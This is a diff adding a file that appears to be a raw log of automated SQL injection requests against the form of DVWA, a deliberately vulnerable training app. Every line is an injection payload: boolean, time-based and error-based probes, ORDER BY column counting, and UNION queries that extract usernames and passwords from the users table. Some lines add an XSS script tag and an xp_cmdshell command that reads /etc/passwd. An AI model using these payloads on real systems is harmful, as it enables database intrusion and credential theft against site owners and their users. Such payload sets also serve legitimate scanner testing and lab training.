@@ -1,0 +1,1158 @@
+1&Submit=Submit
+1&Submit=Submit&lVYG=9635 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+1&Submit=Submit
+6552&Submit=Submit
+1,(.),,".('&Submit=Submit
+1'cAcsVg<'">vcEYAV&Submit=Submit
+1) AND 1347=8245 AND (7397=7397&Submit=Submit
+1) AND 6142=6142 AND (4744=4744&Submit=Submit
+1 AND 3972=1437&Submit=Submit
+1 AND 6142=6142&Submit=Submit
+1 AND 4380=3334-- miSW&Submit=Submit
+1 AND 6142=6142-- FMIp&Submit=Submit
+1') AND 8336=7355 AND ('UyKZ'='UyKZ&Submit=Submit
+1') AND 6142=6142 AND ('jfkU'='jfkU&Submit=Submit
+1' AND 5911=9098 AND 'KMkU'='KMkU&Submit=Submit
+1' AND 6142=6142 AND 'noOX'='noOX&Submit=Submit
+1' AND 6443=8038 AND 'ohJs'='ohJs&Submit=Submit
+1%' AND 5766=6341 AND '%'='&Submit=Submit
+1%' AND 6142=6142 AND '%'='&Submit=Submit
+1) AND 8947=6155#&Submit=Submit
+1) AND 4897=4897#&Submit=Submit
+1)) AND 8442=8814#&Submit=Submit
+1)) AND 4897=4897#&Submit=Submit
+1))) AND 2388=4184#&Submit=Submit
+1))) AND 4897=4897#&Submit=Submit
+1 AND 8801=1416#&Submit=Submit
+1 AND 4897=4897#&Submit=Submit
+1)) AS myAD WHERE 1304=1304 AND 6448=5828#&Submit=Submit
+1)) AS xCHZ WHERE 7848=7848 AND 4897=4897#&Submit=Submit
+1) AS Yqcm WHERE 2878=2878 AND 8194=4769#&Submit=Submit
+1) AS CpBR WHERE 8484=8484 AND 4897=4897#&Submit=Submit
+1` WHERE 6106=6106 AND 2889=3191#&Submit=Submit
+1` WHERE 8755=8755 AND 4897=4897#&Submit=Submit
+1`) WHERE 2550=2550 AND 1500=1243#&Submit=Submit
+1`) WHERE 3360=3360 AND 4897=4897#&Submit=Submit
+1') AND 4382=8337#&Submit=Submit
+1') AND 4897=4897#&Submit=Submit
+1' AND 3084=1440#&Submit=Submit
+1' AND 4897=4897#&Submit=Submit
+1' AND 2028=1675#&Submit=Submit
+1" AND 4442=3650#&Submit=Submit
+1" AND 4897=4897#&Submit=Submit
+1')) AND 8970=1342#&Submit=Submit
+1')) AND 4897=4897#&Submit=Submit
+1'))) AND 9587=8149#&Submit=Submit
+1'))) AND 4897=4897#&Submit=Submit
+1") AND 7042=2365#&Submit=Submit
+1") AND 4897=4897#&Submit=Submit
+1")) AND 4762=5829#&Submit=Submit
+1")) AND 4897=4897#&Submit=Submit
+1"))) AND 8938=4992#&Submit=Submit
+1"))) AND 4897=4897#&Submit=Submit
+1%') AND 9094=5985#&Submit=Submit
+1%') AND 4897=4897#&Submit=Submit
+1%')) AND 4769=8577#&Submit=Submit
+1%')) AND 4897=4897#&Submit=Submit
+1%'))) AND 6965=9038#&Submit=Submit
+1%'))) AND 4897=4897#&Submit=Submit
+1%' AND 8926=2435#&Submit=Submit
+1%' AND 4897=4897#&Submit=Submit
+1%' AND 6985=3771#&Submit=Submit
+1%") AND 6086=4329#&Submit=Submit
+1%") AND 4897=4897#&Submit=Submit
+1%")) AND 5577=9929#&Submit=Submit
+1%")) AND 4897=4897#&Submit=Submit
+1%"))) AND 5780=6408#&Submit=Submit
+1%"))) AND 4897=4897#&Submit=Submit
+1%" AND 3050=1212#&Submit=Submit
+1%" AND 4897=4897#&Submit=Submit
+1')) AS DdAE WHERE 4600=4600 AND 9227=4083#&Submit=Submit
+1')) AS Glrg WHERE 8091=8091 AND 4897=4897#&Submit=Submit
+1")) AS lQRW WHERE 2052=2052 AND 4294=3086#&Submit=Submit
+1")) AS MFIS WHERE 4277=4277 AND 4897=4897#&Submit=Submit
+1') AS fNzn WHERE 9273=9273 AND 1404=8831#&Submit=Submit
+1') AS ZNQf WHERE 1634=1634 AND 4897=4897#&Submit=Submit
+1") AS vpMA WHERE 1728=1728 AND 3053=9466#&Submit=Submit
+1") AS TYTx WHERE 1092=1092 AND 4897=4897#&Submit=Submit
+1' IN BOOLEAN MODE) AND 9838=2102#&Submit=Submit
+1' IN BOOLEAN MODE) AND 4897=4897#&Submit=Submit
+-8691&Submit=Submit
+-6891) OR 6860=3747#&Submit=Submit
+-8388) OR 3028=3028#&Submit=Submit
+-7119)) OR 5452=9937#&Submit=Submit
+-8866)) OR 3028=3028#&Submit=Submit
+-9199))) OR 3525=2569#&Submit=Submit
+-3703))) OR 3028=3028#&Submit=Submit
+-9414 OR 7043=1145#&Submit=Submit
+-5013 OR 3028=3028#&Submit=Submit
+-6518)) AS YKyr WHERE 7384=7384 OR 6287=2697#&Submit=Submit
+-5979)) AS ZrtJ WHERE 9240=9240 OR 3028=3028#&Submit=Submit
+-5934) AS xJlm WHERE 3413=3413 OR 8011=8884#&Submit=Submit
+-2614) AS WcYV WHERE 4860=4860 OR 3028=3028#&Submit=Submit
+-9694') OR 7130=3280#&Submit=Submit
+-7865') OR 3028=3028#&Submit=Submit
+-7857' OR 2170=9394#&Submit=Submit
+-2568' OR 3028=3028#&Submit=Submit
+-1061' KRpSUtLOEn#&Submit=Submit
+-1656' OR 6189=4394#&Submit=Submit
+-5574" OR 5691=6592#&Submit=Submit
+-4628" OR 3028=3028#&Submit=Submit
+-2573')) OR 5580=6690#&Submit=Submit
+-8297')) OR 3028=3028#&Submit=Submit
+-7261'))) OR 7980=5527#&Submit=Submit
+-9767'))) OR 3028=3028#&Submit=Submit
+-5510") OR 5218=6726#&Submit=Submit
+-9533") OR 3028=3028#&Submit=Submit
+-1782")) OR 1802=9526#&Submit=Submit
+-5756")) OR 3028=3028#&Submit=Submit
+-6811"))) OR 7973=6575#&Submit=Submit
+-1150"))) OR 3028=3028#&Submit=Submit
+-7638%') OR 2903=5348#&Submit=Submit
+-2485%') OR 3028=3028#&Submit=Submit
+-9686%')) OR 3400=7473#&Submit=Submit
+-6975%')) OR 3028=3028#&Submit=Submit
+-4815%'))) OR 7763=4239#&Submit=Submit
+-5347%'))) OR 3028=3028#&Submit=Submit
+-7900%' OR 9701=9340#&Submit=Submit
+-4095%' OR 3028=3028#&Submit=Submit
+-1054%' OR 1742=3320#&Submit=Submit
+-7666%' KRpSUtLOEn#&Submit=Submit
+-6919%") OR 3107=4343#&Submit=Submit
+-1638%") OR 3028=3028#&Submit=Submit
+-8008%")) OR 6771=3699#&Submit=Submit
+-6220%")) OR 3028=3028#&Submit=Submit
+-5742%"))) OR 7164=2858#&Submit=Submit
+-5793%"))) OR 3028=3028#&Submit=Submit
+-5992%" OR 4345=5947#&Submit=Submit
+-1031%" OR 3028=3028#&Submit=Submit
+-4018')) AS RipS WHERE 4928=4928 OR 3027=6651#&Submit=Submit
+-3085')) AS UKSp WHERE 5160=5160 OR 3028=3028#&Submit=Submit
+-9280")) AS hHTn WHERE 2030=2030 OR 4650=6731#&Submit=Submit
+-7605")) AS BPyV WHERE 4989=4989 OR 3028=3028#&Submit=Submit
+-9036') AS txyp WHERE 4858=4858 OR 2928=8329#&Submit=Submit
+-3250') AS wVPv WHERE 4127=4127 OR 3028=3028#&Submit=Submit
+-3322") AS iZnw WHERE 1987=1987 OR 5928=6410#&Submit=Submit
+-9643") AS IoEG WHERE 9991=9991 OR 3028=3028#&Submit=Submit
+1) OR NOT 8012=3764#&Submit=Submit
+1) OR NOT 8746=8746#&Submit=Submit
+1)) OR NOT 2558=2463#&Submit=Submit
+1)) OR NOT 8746=8746#&Submit=Submit
+1))) OR NOT 2629=6609#&Submit=Submit
+1))) OR NOT 8746=8746#&Submit=Submit
+1 OR NOT 2142=7645#&Submit=Submit
+1 OR NOT 8746=8746#&Submit=Submit
+1)) AS AGlf WHERE 6811=6811 OR NOT 5824=8603#&Submit=Submit
+1)) AS ZsCa WHERE 7647=7647 OR NOT 8746=8746#&Submit=Submit
+1) AS NeuK WHERE 4097=4097 OR NOT 8875=7515#&Submit=Submit
+1) AS bUFn WHERE 3685=3685 OR NOT 8746=8746#&Submit=Submit
+1` WHERE 9476=9476 OR NOT 6974=4459#&Submit=Submit
+1` WHERE 9939=9939 OR NOT 8746=8746#&Submit=Submit
+1`) WHERE 2315=2315 OR NOT 2634=6064#&Submit=Submit
+1`) WHERE 3093=3093 OR NOT 8746=8746#&Submit=Submit
+1') OR NOT 7322=6145#&Submit=Submit
+1') OR NOT 8746=8746#&Submit=Submit
+1' OR NOT 9675=9897#&Submit=Submit
+1' OR NOT 8746=8746#&Submit=Submit
+1' OR NOT 2081=3087#&Submit=Submit
+1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7162766b71,(SELECT (ELT(8230=8230,1))),0x717a717071,0x78))s), 8446744073709551610, 8446744073709551610)))-- YAGi&Submit=Submit
+1' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7162766b71,(SELECT (ELT(5601=5601,1))),0x717a717071,0x78))s), 8446744073709551610, 8446744073709551610)))-- xEoa&Submit=Submit
+1' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7162766b71,(SELECT (ELT(3264=3264,1))),0x717a717071,0x78))x))-- PvBz&Submit=Submit
+1' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7162766b71,(SELECT (ELT(4071=4071,1))),0x717a717071,0x78))x))-- TGNT&Submit=Submit
+1' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7162766b71,(SELECT (ELT(1777=1777,1))),0x717a717071)) USING utf8)))-- afpd&Submit=Submit
+1' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7162766b71,(SELECT (ELT(6469=6469,1))),0x717a717071)) USING utf8)))-- GCaC&Submit=Submit
+1' AND (SELECT 6680 FROM(SELECT COUNT(*),CONCAT(0x7162766b71,(SELECT (ELT(6680=6680,1))),0x717a717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- fptO&Submit=Submit
+(SELECT CONCAT(0x7162766b71,(SELECT (ELT(7089=7089,1))),0x717a717071))&Submit=Submit
+1';SELECT SLEEP(5)#&Submit=Submit
+1';SELECT SLEEP(5)-- tpBX&Submit=Submit
+1';(SELECT * FROM (SELECT(SLEEP(5)))JlYb)#&Submit=Submit
+1';(SELECT * FROM (SELECT(SLEEP(5)))mANK)-- ByLD&Submit=Submit
+1';SELECT BENCHMARK(5000000,MD5(0x4c5a5044))#&Submit=Submit
+1';SELECT BENCHMARK(5000000,MD5(0x6b444479))-- Vrlo&Submit=Submit
+1' AND SLEEP(5)-- SUrO&Submit=Submit
+1' AND SLEEP(0)-- SUrO&Submit=Submit
+1' AND SLEEP(5)-- SUrO&Submit=Submit
+1' ORDER BY 1#&Submit=Submit
+1' ORDER BY 2842#&Submit=Submit
+1' ORDER BY 10#&Submit=Submit
+1' ORDER BY 6#&Submit=Submit
+1' ORDER BY 4#&Submit=Submit
+1' ORDER BY 3#&Submit=Submit
+1' ORDER BY 2#&Submit=Submit
+1' UNION ALL SELECT CONCAT(0x7162766b71,0x677a54425963784d61556d734a44674773797667725057714e4e76745468527a415045427a6a786b,0x717a717071),NULL#&Submit=Submit
+1' UNION ALL SELECT CONCAT(0x7162766b71,0x677a54425963784d61556d734a44674773797667725057714e4e76745468527a415045427a6a786b,0x717a717071),NULL UNION ALL SELECT CONCAT(0x7162766b71,0x74776e4e466556437a7a444b48596573535946664553564961436576724b6648587871766a575576,0x717a717071),NULL#&Submit=Submit
+1' UNION ALL SELECT CONCAT(0x7162766b71,0x677a54425963784d61556d734a44674773797667725057714e4e76745468527a415045427a6a786b,0x717a717071),NULL FROM (SELECT 0 AS LuRr UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9 UNION SELECT 10 UNION SELECT 11 UNION SELECT 12 UNION SELECT 13 UNION SELECT 14) AS WGVn#&Submit=Submit
+1' UNION ALL SELECT CONCAT(0x7162766b71,(CASE WHEN (5794=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                5794) THEN 1 ELSE 0 END),0x717a717071),NULL#&Submit=Submit
+1' UNION ALL SELECT CONCAT(0x7162766b71,IFNULL(CAST(`user` AS CHAR),0x20),0x6c69626f6475,IFNULL(CAST(password AS CHAR),0x20),0x717a717071),NULL FROM dvwa.users ORDER BY `user`#&Submit=Submit
+1' UNION ALL SELECT CONCAT(0x7162766b71,IFNULL(CAST(COUNT(*) AS CHAR),0x20),0x717a717071),NULL FROM dvwa.users#&Submit=Submit
+1' UNION ALL SELECT (SELECT CONCAT(0x7162766b71,IFNULL(CAST(`user` AS CHAR),0x20),0x6c69626f6475,IFNULL(CAST(password AS CHAR),0x20),0x717a717071) FROM dvwa.users ORDER BY `user` LIMIT 0,1),NULL#&Submit=Submit
+1' UNION ALL SELECT (SELECT CONCAT(0x7162766b71,IFNULL(CAST(`user` AS CHAR),0x20),0x6c69626f6475,IFNULL(CAST(password AS CHAR),0x20),0x717a717071) FROM dvwa.users ORDER BY `user` LIMIT 1,1),NULL#&Submit=Submit
+1' UNION ALL SELECT (SELECT CONCAT(0x7162766b71,IFNULL(CAST(`user` AS CHAR),0x20),0x6c69626f6475,IFNULL(CAST(password AS CHAR),0x20),0x717a717071) FROM dvwa.users ORDER BY `user` LIMIT 2,1),NULL#&Submit=Submit
+1' UNION ALL SELECT (SELECT CONCAT(0x7162766b71,IFNULL(CAST(`user` AS CHAR),0x20),0x6c69626f6475,IFNULL(CAST(password AS CHAR),0x20),0x717a717071) FROM dvwa.users ORDER BY `user` LIMIT 3,1),NULL#&Submit=Submit
+1' UNION ALL SELECT (SELECT CONCAT(0x7162766b71,IFNULL(CAST(`user` AS CHAR),0x20),0x6c69626f6475,IFNULL(CAST(password AS CHAR),0x20),0x717a717071) FROM dvwa.users ORDER BY `user` LIMIT 4,1),NULL#&Submit=Submit
+1&Submit=Submit
+1' UNION ALL SELECT CONCAT(0x7162766b71,IFNULL(CAST(`user` AS CHAR),0x20),0x6c69626f6475,IFNULL(CAST(password AS CHAR),0x20),0x717a717071),NULL FROM dvwa.users ORDER BY `user`#&Submit=Submit
+1&Submit=Submit
+1&Submit=Submit&tVpj=5228 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+1&Submit=Submit
+1."...(',.,&Submit=Submit
+1'XVDbnL<'">fsKOfk&Submit=Submit
+1) AND 5952=9900-- RpVn&Submit=Submit
+1) AND 1236=1236-- GUTF&Submit=Submit
+1) AND 6885=8768-- znmw&Submit=Submit
+1) AND 6620=3633 AND (7079=7079&Submit=Submit
+1) AND 1236=1236 AND (5320=5320&Submit=Submit
+1) AND 9237=2028 AND (3308=3308&Submit=Submit
+1)) AND 8121=9111 AND ((1815=1815&Submit=Submit
+1)) AND 1236=1236 AND ((8887=8887&Submit=Submit
+1)) AND 4821=7191 AND ((2422=2422&Submit=Submit
+1))) AND 9916=1778 AND (((1139=1139&Submit=Submit
+1))) AND 1236=1236 AND (((4803=4803&Submit=Submit
+1))) AND 6223=5063 AND (((6108=6108&Submit=Submit
+1 AND 9373=2867&Submit=Submit
+1 AND 1236=1236&Submit=Submit
+1 AND 1930=8118&Submit=Submit
+1 AND 5781=1612-- Utzl&Submit=Submit
+1 AND 1236=1236-- czTI&Submit=Submit
+1 AND 3858=1274-- kjfj&Submit=Submit
+1 AND 8929=1117# qWfl&Submit=Submit
+1 AND 1236=1236# Bnpl&Submit=Submit
+1 AND 8177=9976# bzgI&Submit=Submit
+1' AND 6816=1818-- HHtO&Submit=Submit
+1' AND 1236=1236-- SZLJ&Submit=Submit
+1' AND 8505=1898-- megD&Submit=Submit
+1') AND 9950=5188 AND ('VlZj'='VlZj&Submit=Submit
+1') AND 1236=1236 AND ('SfzD'='SfzD&Submit=Submit
+1') AND 5848=7965 AND ('ylRm'='ylRm&Submit=Submit
+1')) AND 2198=3755 AND (('vQPP'='vQPP&Submit=Submit
+1')) AND 1236=1236 AND (('LiSH'='LiSH&Submit=Submit
+1')) AND 6735=7947 AND (('bTtV'='bTtV&Submit=Submit
+1'))) AND 8402=5861 AND ((('SKNS'='SKNS&Submit=Submit
+1'))) AND 1236=1236 AND ((('rvhx'='rvhx&Submit=Submit
+1'))) AND 7735=5522 AND ((('qlre'='qlre&Submit=Submit
+1' AND 1123=4950 AND 'rpPk'='rpPk&Submit=Submit
+1' AND 1236=1236 AND 'grAk'='grAk&Submit=Submit
+1' AND 4756=3932 AND 'DqCS'='DqCS&Submit=Submit
+1') AND 8554=3475 AND ('PSSR' LIKE 'PSSR&Submit=Submit
+1') AND 1236=1236 AND ('xuSK' LIKE 'xuSK&Submit=Submit
+1') AND 3379=1773 AND ('Frke' LIKE 'Frke&Submit=Submit
+1')) AND 4140=3414 AND (('nNLw' LIKE 'nNLw&Submit=Submit
+1')) AND 1236=1236 AND (('iqtp' LIKE 'iqtp&Submit=Submit
+1')) AND 8127=3397 AND (('rXka' LIKE 'rXka&Submit=Submit
+1' AND 2086=1854 AND 'YPPY' LIKE 'YPPY&Submit=Submit
+1' AND 1236=1236 AND 'dirE' LIKE 'dirE&Submit=Submit
+1' AND 9281=2371 AND 'RwqF' LIKE 'RwqF&Submit=Submit
+1") AND 2875=3570 AND ("xTqt"="xTqt&Submit=Submit
+1") AND 1236=1236 AND ("zIgu"="zIgu&Submit=Submit
+1") AND 4708=9237 AND ("mozE"="mozE&Submit=Submit
+1")) AND 5536=8386 AND (("dkBI"="dkBI&Submit=Submit
+1")) AND 1236=1236 AND (("Kwuj"="Kwuj&Submit=Submit
+1")) AND 1429=1175 AND (("ibgg"="ibgg&Submit=Submit
+1" AND 6668=2405 AND "UfrC"="UfrC&Submit=Submit
+1" AND 1236=1236 AND "IKdR"="IKdR&Submit=Submit
+1" AND 1829=6812 AND "iKwO"="iKwO&Submit=Submit
+1") AND 4602=2655 AND ("TyUz" LIKE "TyUz&Submit=Submit
+1") AND 1236=1236 AND ("wxgF" LIKE "wxgF&Submit=Submit
+1") AND 6492=3962 AND ("XpTI" LIKE "XpTI&Submit=Submit
+1" AND 4835=7091 AND "SjQA" LIKE "SjQA&Submit=Submit
+1" AND 1236=1236 AND "jQWH" LIKE "jQWH&Submit=Submit
+1" AND 3212=6469 AND "MuXk" LIKE "MuXk&Submit=Submit
+1%') AND 8735=7764 AND ('%'='&Submit=Submit
+1%') AND 1236=1236 AND ('%'='&Submit=Submit
+1%') AND 6757=9244 AND ('%'='&Submit=Submit
+1%')) AND 2915=1303 AND (('%'='&Submit=Submit
+1%')) AND 1236=1236 AND (('%'='&Submit=Submit
+1%')) AND 1452=2195 AND (('%'='&Submit=Submit
+1%' AND 4484=2269 AND '%'='&Submit=Submit
+1%' AND 1236=1236 AND '%'='&Submit=Submit
+1%' AND 3465=3511 AND '%'='&Submit=Submit
+1%" AND 8211=6846 AND "%"="&Submit=Submit
+1%" AND 1236=1236 AND "%"="&Submit=Submit
+1%" AND 7263=9264 AND "%"="&Submit=Submit
+1)) AND 5933=6324-- tOjW&Submit=Submit
+1)) AND 2095=2095-- Ngay&Submit=Submit
+1)) AND 1407=9736-- jiBr&Submit=Submit
+1))) AND 1979=1964-- GbzA&Submit=Submit
+1))) AND 2095=2095-- tZwm&Submit=Submit
+1))) AND 9880=1962-- uXCW&Submit=Submit
+1') AND 4485=3746-- qIph&Submit=Submit
+1') AND 2095=2095-- hCAe&Submit=Submit
+1') AND 7478=2533-- waLJ&Submit=Submit
+1')) AND 5865=6391-- Bwbx&Submit=Submit
+1')) AND 2095=2095-- oOFa&Submit=Submit
+1')) AND 9636=2271-- dYxn&Submit=Submit
+1'))) AND 2762=2033-- XbJM&Submit=Submit
+1'))) AND 2095=2095-- XvBe&Submit=Submit
+1'))) AND 4305=1488-- dQVp&Submit=Submit
+1") AND 8108=2135-- KgDe&Submit=Submit
+1") AND 2095=2095-- tngS&Submit=Submit
+1") AND 1453=5909-- hDfx&Submit=Submit
+1")) AND 4601=3543-- NABi&Submit=Submit
+1")) AND 2095=2095-- VSSS&Submit=Submit
+1")) AND 7486=8081-- meHu&Submit=Submit
+1" AND 1944=9815-- CbJm&Submit=Submit
+1&Submit=Submit
+1&Submit=Submit
+1',)(."),,)&Submit=Submit
+1'OJLLpL<'">CByHAW&Submit=Submit
+1) AND 9905=8409-- oKZx&Submit=Submit
+1) AND 3850=3850-- RYeN&Submit=Submit
+1) AND 1288=8968-- NLzS&Submit=Submit
+1) AND 8381=2129 AND (5738=5738&Submit=Submit
+1) AND 3850=3850 AND (9439=9439&Submit=Submit
+1) AND 6999=4632 AND (7079=7079&Submit=Submit
+1)) AND 7226=6511 AND ((8246=8246&Submit=Submit
+1)) AND 3850=3850 AND ((8004=8004&Submit=Submit
+1)) AND 5029=3432 AND ((5782=5782&Submit=Submit
+1))) AND 7986=7072 AND (((4784=4784&Submit=Submit
+1))) AND 3850=3850 AND (((8109=8109&Submit=Submit
+1))) AND 1842=6874 AND (((3572=3572&Submit=Submit
+1 AND 3319=2615&Submit=Submit
+1 AND 3850=3850&Submit=Submit
+1 AND 7711=9796&Submit=Submit
+1 AND 3129=5899-- UDUu&Submit=Submit
+1 AND 3850=3850-- AfPC&Submit=Submit
+1 AND 3870=4005-- SDhI&Submit=Submit
+1 AND 6147=2257# aKjD&Submit=Submit
+1 AND 3850=3850# CauR&Submit=Submit
+1 AND 1944=2101# xgzp&Submit=Submit
+1' AND 2984=1696-- xrtM&Submit=Submit
+1' AND 3850=3850-- CPIg&Submit=Submit
+1' AND 7665=2326-- LbLI&Submit=Submit
+1') AND 6491=4931 AND ('khkl'='khkl&Submit=Submit
+1') AND 3850=3850 AND ('Aphx'='Aphx&Submit=Submit
+1') AND 8520=6309 AND ('mkyi'='mkyi&Submit=Submit
+1')) AND 6882=6650 AND (('tftP'='tftP&Submit=Submit
+1')) AND 3850=3850 AND (('dCtt'='dCtt&Submit=Submit
+1')) AND 8848=8482 AND (('BbQu'='BbQu&Submit=Submit
+1'))) AND 8199=2734 AND ((('vYbJ'='vYbJ&Submit=Submit
+1'))) AND 3850=3850 AND ((('rYeL'='rYeL&Submit=Submit
+1'))) AND 5037=3680 AND ((('Dfit'='Dfit&Submit=Submit
+1' AND 1504=7952 AND 'oVYi'='oVYi&Submit=Submit
+1' AND 3850=3850 AND 'NsnT'='NsnT&Submit=Submit
+1' AND 3154=1060 AND 'GeXX'='GeXX&Submit=Submit
+1') AND 3598=1723 AND ('LpHr' LIKE 'LpHr&Submit=Submit
+1') AND 3850=3850 AND ('buno' LIKE 'buno&Submit=Submit
+1') AND 2322=8036 AND ('Xwoa' LIKE 'Xwoa&Submit=Submit
+1')) AND 3953=8039 AND (('ChdZ' LIKE 'ChdZ&Submit=Submit
+1')) AND 3850=3850 AND (('EUGo' LIKE 'EUGo&Submit=Submit
+1')) AND 4292=9867 AND (('lwVE' LIKE 'lwVE&Submit=Submit
+1' AND 4281=1189 AND 'etAb' LIKE 'etAb&Submit=Submit
+1' AND 3850=3850 AND 'gxik' LIKE 'gxik&Submit=Submit
+1' AND 1272=3718 AND 'UQsx' LIKE 'UQsx&Submit=Submit
+1") AND 8839=3935 AND ("XeIi"="XeIi&Submit=Submit
+1") AND 3850=3850 AND ("ZizG"="ZizG&Submit=Submit
+1") AND 6696=6399 AND ("NubC"="NubC&Submit=Submit
+1")) AND 3538=7259 AND (("YFpp"="YFpp&Submit=Submit
+1")) AND 3850=3850 AND (("RcpM"="RcpM&Submit=Submit
+1")) AND 7119=7738 AND (("AsAW"="AsAW&Submit=Submit
+1" AND 3369=6097 AND "fKwC"="fKwC&Submit=Submit
+1" AND 3850=3850 AND "pOcA"="pOcA&Submit=Submit
+1" AND 5861=8662 AND "MtEg"="MtEg&Submit=Submit
+1") AND 8065=1518 AND ("HsAy" LIKE "HsAy&Submit=Submit
+1") AND 3850=3850 AND ("jsXY" LIKE "jsXY&Submit=Submit
+1") AND 1575=8182 AND ("jsKa" LIKE "jsKa&Submit=Submit
+1" AND 9560=9197 AND "XtvJ" LIKE "XtvJ&Submit=Submit
+1" AND 3850=3850 AND "xZuM" LIKE "xZuM&Submit=Submit
+1" AND 6488=8869 AND "GaQu" LIKE "GaQu&Submit=Submit
+1%') AND 9495=2761 AND ('%'='&Submit=Submit
+1%') AND 3850=3850 AND ('%'='&Submit=Submit
+1%') AND 1328=7920 AND ('%'='&Submit=Submit
+1%')) AND 8998=4697 AND (('%'='&Submit=Submit
+1%')) AND 3850=3850 AND (('%'='&Submit=Submit
+1%')) AND 6257=5420 AND (('%'='&Submit=Submit
+1%' AND 6305=3859 AND '%'='&Submit=Submit
+1%' AND 3850=3850 AND '%'='&Submit=Submit
+1%' AND 7566=7960 AND '%'='&Submit=Submit
+1%" AND 5494=7643 AND "%"="&Submit=Submit
+1%" AND 3850=3850 AND "%"="&Submit=Submit
+1%" AND 9288=7972 AND "%"="&Submit=Submit
+1)) AND 1324=9402-- ulHd&Submit=Submit
+1)) AND 9081=9081-- tEra&Submit=Submit
+1)) AND 5030=8504-- IMBn&Submit=Submit
+1))) AND 1009=8139-- eHeX&Submit=Submit
+1))) AND 9081=9081-- QDtV&Submit=Submit
+1))) AND 7959=9969-- pFre&Submit=Submit
+1') AND 5022=9130-- aOhT&Submit=Submit
+1') AND 9081=9081-- IBRE&Submit=Submit
+1') AND 7654=5893-- qqMB&Submit=Submit
+1')) AND 8682=4744-- aZEo&Submit=Submit
+1')) AND 9081=9081-- GBRW&Submit=Submit
+1')) AND 1609=2524-- SPyA&Submit=Submit
+1'))) AND 2529=6754-- HsLX&Submit=Submit
+1'))) AND 9081=9081-- EyCE&Submit=Submit
+1'))) AND 5433=2668-- NcNJ&Submit=Submit
+1") AND 6013=1093-- oaWZ&Submit=Submit
+1") AND 9081=9081-- ocrR&Submit=Submit
+1") AND 2416=4923-- GmYh&Submit=Submit
+1")) AND 7997=5881-- BZxr&Submit=Submit
+1")) AND 9081=9081-- ltPL&Submit=Submit
+1")) AND 2506=7118-- vGWl&Submit=Submit
+1" AND 8463=7507-- htPo&Submit=Submit
+1" AND 9081=9081-- KqFK&Submit=Submit
+1" AND 2044=9324-- UvhP&Submit=Submit
+1%') AND 6028=9791-- DNFL&Submit=Submit
+1%') AND 9081=9081-- dClS&Submit=Submit
+1%') AND 1922=6128-- vsvk&Submit=Submit
+1%')) AND 8695=1143-- YzBJ&Submit=Submit
+1%')) AND 9081=9081-- HYRH&Submit=Submit
+1%')) AND 4266=1346-- ybSy&Submit=Submit
+1%' AND 8531=4880-- QDyb&Submit=Submit
+1%' AND 9081=9081-- mmdK&Submit=Submit
+1%' AND 7111=3098-- XuDg&Submit=Submit
+1%" AND 3810=6345-- kTil&Submit=Submit
+1%" AND 9081=9081-- eiOE&Submit=Submit
+1%" AND 2963=8605-- nTwU&Submit=Submit
+1) AND 4295=6300#&Submit=Submit
+1) AND 3437=3437#&Submit=Submit
+1) AND 4864=6692#&Submit=Submit
+1)) AND 7678=6760#&Submit=Submit
+1)) AND 3437=3437#&Submit=Submit
+1)) AND 2930=2400#&Submit=Submit
+1))) AND 2284=8880#&Submit=Submit
+1))) AND 3437=3437#&Submit=Submit
+1))) AND 8806=3308#&Submit=Submit
+1 AND 9554=2805#&Submit=Submit
+1 AND 3437=3437#&Submit=Submit
+1 AND 5530=1233#&Submit=Submit
+1' AND 4575=6059#&Submit=Submit
+1' AND 3437=3437#&Submit=Submit
+1' AND 7581=6478#&Submit=Submit
+1') AND 2496=3807#&Submit=Submit
+1') AND 3437=3437#&Submit=Submit
+1') AND 1988=5505#&Submit=Submit
+1')) AND 9179=2160#&Submit=Submit
+1')) AND 3437=3437#&Submit=Submit
+1')) AND 8765=7446#&Submit=Submit
+1'))) AND 8706=2073#&Submit=Submit
+1'))) AND 3437=3437#&Submit=Submit
+1'))) AND 7741=5840#&Submit=Submit
+1") AND 8072=4415#&Submit=Submit
+1") AND 3437=3437#&Submit=Submit
+1") AND 5499=6759#&Submit=Submit
+1")) AND 9478=1969#&Submit=Submit
+1")) AND 3437=3437#&Submit=Submit
+1")) AND 4134=3274#&Submit=Submit
+1" AND 6491=6029#&Submit=Submit
+1" AND 3437=3437#&Submit=Submit
+1" AND 5335=6709#&Submit=Submit
+1%') AND 8206=1506#&Submit=Submit
+1%') AND 3437=3437#&Submit=Submit
+1%') AND 4912=9574#&Submit=Submit
+1%')) AND 8440=9803#&Submit=Submit
+1%')) AND 3437=3437#&Submit=Submit
+1%')) AND 7757=6618#&Submit=Submit
+1%' AND 1599=2007#&Submit=Submit
+1%' AND 3437=3437#&Submit=Submit
+1%' AND 1956=9458#&Submit=Submit
+1%" AND 2537=7617#&Submit=Submit
+1%" AND 3437=3437#&Submit=Submit
+1%" AND 8343=5634#&Submit=Submit
+1) AND 1131=8799&Submit=Submit
+1) AND 5002=5002&Submit=Submit
+1) AND 2572=8247&Submit=Submit
+1)) AND 8684=8149&Submit=Submit
+1)) AND 5002=5002&Submit=Submit
+1)) AND 6683=3510&Submit=Submit
+1))) AND 2700=6256&Submit=Submit
+1))) AND 5002=5002&Submit=Submit
+1))) AND 7535=2538&Submit=Submit
+1 AND 4067=4966&Submit=Submit
+1 AND 5002=5002&Submit=Submit
+1 AND 8583=1972&Submit=Submit
+1' AND 4614=2551&Submit=Submit
+1' AND 5002=5002&Submit=Submit
+1' AND 4086=7140&Submit=Submit
+1') AND 3588=7791&Submit=Submit
+1') AND 5002=5002&Submit=Submit
+1') AND 7302=8792&Submit=Submit
